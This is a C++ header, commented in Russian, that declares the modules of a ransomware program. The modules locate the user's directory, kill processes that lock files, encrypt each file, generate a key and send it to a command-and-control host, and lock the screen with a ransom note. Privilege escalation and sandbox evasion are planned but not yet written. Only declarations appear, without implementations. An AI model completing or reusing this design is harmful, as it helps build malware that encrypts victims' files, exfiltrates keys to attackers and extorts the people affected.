//shared_ptr<vector<>>

// All about files
class FileModule
{
private:
    int KillActiveFile() const; // Чекает используется ли файл и убивает процесс, который его юзает
    int DirectoryCheck() const; // Если директорию не нужно шифровать, возвращает  0

    path_t directory; // Директория, которую вернёт метод FindDirectory
    size_t fileOrder; // Здесь хранится номер файла который сейчас вернёт GetNextFile или типа того

public:
    FileModule();  // объявляем конструктор 
    void FindDirectory(); // Ищет наименьшую директорию, на которую у нас есть права "C:\Users\{Username}\" и записывает в атрибут directory
    path_t GetNextFile() const; // возвращает следующий файл, который необходимо зашифровать либо Null если закончились
};

// All about cipher
class CipherModule
{
public:
    std::string key;
    CipherModule(std::string key); // объявляем конструктор передавая ключ которым надо всё шифровать, он запишет его в атрибут key
    int Cipher(path_t file) const; // Передаём файл который надо зашифровать, возращает 0 если всё ок
};

// Generate cipher key and send it to the specified C2
class KeyModule
{
public:
    std::string key;
    KeyModule(std::string C2Address); // Передаём хост который получит ключ
    void KeyGen(); // Запишет в атрибут key сгенеренный ключ
    int SendKey() const; // Отправит ключ на сервак указанный при создании шаблона класса
};

// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
class NoteModule
{
public:
    NoteModule();
    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
};

// Escalate our privileges to local admin if not already
// class PrivEscModule { # ToDo # };

// Check if we are in a sandbox and if true > do nothing  
// class SandboxEvasionModule { # ToDo # };

class FileSearch {

};